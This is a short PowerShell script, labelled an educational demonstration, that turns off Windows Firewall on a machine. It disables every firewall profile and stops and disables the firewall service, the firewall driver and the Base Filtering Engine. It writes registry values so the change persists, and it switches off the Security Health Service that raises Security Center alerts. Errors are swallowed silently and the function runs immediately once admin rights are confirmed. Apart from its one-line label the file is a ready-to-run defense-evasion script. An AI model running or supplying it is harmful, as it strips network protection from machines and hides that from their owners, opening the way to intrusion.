# Warning: Educational demonstration only
# Disables Windows Firewall and related security features

function Disable-FirewallSecurity {
    try {
        # Disable all firewall profiles
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
        
        # Disable Windows Firewall service
        $services = @(
            "mpssvc",           # Windows Defender Firewall
            "mpsdrv",           # Windows Firewall Driver
            "BFE"               # Base Filtering Engine
        )
        
        foreach ($service in $services) {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        # Disable through registry for persistence
        $regPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile",
            "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile",
            "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
        )
        
        foreach ($path in $regPaths) {
            if (!(Test-Path $path)) {
                New-Item -Path $path -Force | Out-Null
            }
            Set-ItemProperty -Path $path -Name "EnableFirewall" -Value 0 -Type DWord -Force
        }
        
        # Disable Windows Security Center notifications
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Type DWord -Force
        
        Write-Output "Firewall and related security features disabled"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Check for admin rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Requires administrative privileges"
    exit 1
}

Disable-FirewallSecurity
